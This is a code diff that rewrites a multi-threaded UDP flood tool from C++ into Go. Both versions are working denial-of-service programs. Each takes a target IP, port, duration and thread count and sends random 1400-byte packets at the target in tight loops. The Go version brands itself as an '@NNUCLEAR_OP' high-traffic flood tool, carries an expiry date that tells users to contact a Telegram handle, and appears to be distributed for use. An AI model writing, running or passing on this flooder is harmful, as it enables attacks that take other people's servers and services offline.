@@ -1,109 +1,152 @@
-#include <iostream> //#THIS FILE OWNER IS @NNUCLEAR_OP
-#include <cstring>  //#THIS FILE OWNER IS @NNUCLEAR_OP
-#include <cstdlib>  //#THIS FILE OWNER IS @NNUCLEAR_OP
-#include <ctime>    //#THIS FILE OWNER IS @NNUCLEAR_OP
-#include <winsock2.h> //# For Windows sockets
-#include <ws2tcpip.h> //# For InetPton and related functions
-#include <vector>   //#THIS FILE OWNER IS @NNUCLEAR_OP
-#include <thread>   //#THIS FILE OWNER IS @NNUCLEAR_OP
-#include <mutex>    //#THIS FILE OWNER IS @NNUCLEAR_OP
+package main
 
-#pragma comment(lib, "ws2_32.lib") //# Link winsock library
+import (
+	"fmt"
+	"math/rand"
+	"net"
+	"os"
+	"os/signal"
+	"strconv"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+)
 
-#define PAYLOAD_SIZE 1400          //# Latest payload size
-#define DEFAULT_THREAD_COUNT 800   //# Default thread count
+// Default payload size (in bytes)
+const defaultPayloadSize = 1400
 
-std::mutex log_mutex;
-
-// Function to generate a random payload for UDP packets
-void generate_payload(char *buffer, size_t size) {
-    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    for (size_t i = 0; i < size; ++i) {
-        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
-    }
+// Display a bordered message
+func displayMessage(message string) {
+	fmt.Println("╔════════════════════════════════════════╗")
+	fmt.Println(message)
+	fmt.Println("╚════════════════════════════════════════╝")
 }
 
-// Function to send UDP packets in a single thread
-void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
-    sockaddr_in server_addr{};
-    char buffer[PAYLOAD_SIZE];
-
-    // Initialize Winsock
-    WSADATA wsa;
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        std::cerr << "Thread " << thread_id << " - Error: WSAStartup failed. Code: " << WSAGetLastError() << std::endl;
-        return;
-    }
-
-    // Create a UDP socket
-    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock == INVALID_SOCKET) {
-        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << WSAGetLastError() << std::endl;
-        WSACleanup();
-        return;
-    }
-
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-
-    // Use inet_addr for compatibility
-    server_addr.sin_addr.s_addr = inet_addr(ip);
-    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
-        std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
-
-    generate_payload(buffer, PAYLOAD_SIZE);
-
-    time_t start_time = time(nullptr);
-    while (time(nullptr) - start_time < attack_time) {
-        int sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-        if (sent == SOCKET_ERROR) {
-            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << WSAGetLastError() << std::endl;
-        }
-    }
-
-    closesocket(sock);
-    WSACleanup();
-
-    std::lock_guard<std::mutex> lock(log_mutex);
-    std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
+// Validate binary name
+func validateBinaryName(binaryName string) {
+	if !strings.HasSuffix(binaryName, "raja.exe") {
+		displayMessage("║           INVALID BINARY NAME!         ║\n" +
+			"║    Binary must be named 'raja.exe'        ║")
+		os.Exit(1)
+	}
 }
 
-// Function to run the UDP attack in multiple threads
-void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
-    std::vector<std::thread> threads;
-
-    std::cout << "Launching multi-threaded UDP flood attack with " << thread_count << " threads...\n";
-
-    for (int i = 0; i < thread_count; ++i) {
-        threads.emplace_back(udp_attack_thread, ip, port, attack_time, i + 1);
-    }
-
-    for (auto &thread : threads) {
-        if (thread.joinable()) {
-            thread.join();
-        }
-    }
-
-    std::cout << "Multi-threaded attack completed." << std::endl;
+// Check if binary has expired
+func checkBinaryExpiry() {
+	expiryDate := time.Date(2025, 1, 15, 23, 59, 59, 0, time.UTC)
+	if time.Now().After(expiryDate) {
+		displayMessage("║           BINARY EXPIRED!              ║\n" +
+			"║    Please contact the owner at:        ║\n" +
+			"║    Telegram: @NNUCLEAR_OP              ║")
+		os.Exit(1)
+	}
 }
 
-// Main function
-int main(int argc, char *argv[]) {
-    if (argc != 4 && argc != 5) {
-        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
-        return EXIT_FAILURE;
-    }
+// Validate IP address
+func validateIP(ip string) {
+	if net.ParseIP(ip) == nil {
+		fmt.Printf("Invalid IP address: %s\n", ip)
+		os.Exit(1)
+	}
+}
 
-    const char *ip = argv[1];
-    int port = std::stoi(argv[2]);
-    int duration = std::stoi(argv[3]);
-    int thread_count = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_THREAD_COUNT;
+// Generate random payload
+func generatePayload(size int) string {
+	hexChars := "0123456789abcdef"
+	payload := make([]byte, size*4)
+	for i := 0; i < size; i++ {
+		payload[i*4] = '\\'
+		payload[i*4+1] = 'x'
+		payload[i*4+2] = hexChars[rand.Intn(16)]
+		payload[i*4+3] = hexChars[rand.Intn(16)]
+	}
+	return string(payload)
+}
 
-    multi_threaded_udp_attack(ip, port, duration, thread_count);
+// Attack routine with high traffic generation
+func attack(ip string, port int, duration int, payloadSize int, wg *sync.WaitGroup) {
+	defer wg.Done()
 
-    return EXIT_SUCCESS;
+	// Use the Windows-compatible UDP connection (this works on both Windows and Linux)
+	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
+	if err != nil {
+		fmt.Printf("Socket creation failed: %v\n", err)
+		return
+	}
+	defer conn.Close()
+
+	payload := generatePayload(payloadSize)
+	endTime := time.Now().Add(time.Duration(duration) * time.Second)
+
+	for time.Now().Before(endTime) {
+		_, err := conn.Write([]byte(payload))
+		if err != nil {
+			fmt.Printf("Send failed: %v\n", err)
+			return
+		}
+	}
+}
+
+func main() {
+	// Check binary name and expiry date
+	validateBinaryName(os.Args[0])
+	checkBinaryExpiry()
+
+	// Ensure correct number of arguments
+	if len(os.Args) != 5 {
+		displayMessage("Usage: ./nuclear <ip> <port> <duration> <threads>")
+		os.Exit(1)
+	}
+
+	// Get command-line arguments
+	ip := os.Args[1]
+	port, err := strconv.Atoi(os.Args[2])
+	if err != nil {
+		fmt.Println("Invalid port:", os.Args[2])
+		os.Exit(1)
+	}
+	duration, err := strconv.Atoi(os.Args[3])
+	if err != nil {
+		fmt.Println("Invalid duration:", os.Args[3])
+		os.Exit(1)
+	}
+	threads, err := strconv.Atoi(os.Args[4])
+	if err != nil {
+		fmt.Println("Invalid thread count:", os.Args[4])
+		os.Exit(1)
+	}
+
+	// Validate the provided IP address
+	validateIP(ip)
+
+	// Display message
+	displayMessage("║            @NNUCLEAR_OP SYSTEM              ║\n" +
+		"║         HIGH TRAFFIC UDP FLOOD TOOL          ║")
+
+	fmt.Printf("Starting attack on %s:%d for %d seconds with %d threads\n",
+		ip, port, duration, threads)
+
+	// Handle interrupt signals for both Unix-like and Windows systems
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	go func() {
+		<-sigChan
+		fmt.Println("\nStopping attack...")
+		os.Exit(0)
+	}()
+
+	// Launch threads
+	var wg sync.WaitGroup
+	for i := 0; i < threads; i++ {
+		wg.Add(1)
+		go attack(ip, port, duration, defaultPayloadSize, &wg)
+	}
+
+	// Wait for all threads to complete
+	wg.Wait()
+
+	// Display message after attack
+	fmt.Println("\nAttack completed. Join @NNUCLEAR_OP for more updates.")
 }
